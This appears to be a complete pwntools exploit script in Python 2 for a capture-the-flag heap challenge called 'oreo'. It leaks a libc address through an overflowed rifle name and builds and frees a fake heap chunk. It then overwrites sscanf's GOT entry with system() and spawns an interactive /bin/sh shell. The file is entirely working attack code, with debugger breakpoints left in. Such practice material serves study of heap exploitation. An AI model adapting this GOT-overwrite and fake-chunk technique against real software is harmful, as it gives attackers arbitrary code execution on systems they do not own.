from pwn import *
context.binary = './oreo'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./oreo',  stdin=PTY)

def dbg():
	raw_input()

def add(name, description):
	p.recvuntil('Action: ')
	p.sendline('1')
	p.recvuntil('Rifle name: ')
	p.sendline(name)
	p.recvuntil('Rifle description: ')
	p.sendline(description)

	print "add a chunk success!"

def show(idx):
	p.recvuntil('Action: ')
	p.sendline('2')
	for i in range(idx):
		p.recvuntil('Description: ')
	p.recvuntil('Description: ')
	return u32(p.recv(4))

def order():
	p.recvuntil('Action: ')
	p.sendline('3')
	
	print "order success!"

def message(msg):
	p.recvuntil('Action: ')
	p.sendline('4')	
	p.recvuntil('submit with your order: ')
	p.sendline(msg)

	print "leave message success!"

def state():
	p.recvuntil('Action: ')
	p.sendline('5')		

#leak libc
printf_got = elf.got['printf']
sscanf_got = 0x0804A258
add('a'*0x1b + p32(printf_got), 'd')			#cover chunk0' next and fake chunk1
printf_addr = show(1)
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']

print "libc_base ==> "+hex(libc_base)
print "system_addr ==> "+hex(system_addr)


fake_chunk = 0x0804A2A0
#make fake chunk (start at &ordersCnt)' size to 0x41
for i in range(0x40-1):
	add('a', 'b')

add('a'*0x1b + p32(fake_chunk+0x8), 'd')

gdb.attach(p, 'b* 0x08048A25')
dbg()

message(p32(0)*9 + p32(0x41))	#fake)chunk' next chunk' size
order()					#free the fake_chunk

#get the fake_chunk
#this means message's address is under control
add('a', p32(sscanf_got))
message(p32(system_addr))

p.recvuntil('Action: ')
p.sendline('/bin/sh\x00')					#get shell

p.interactive()
p.close()




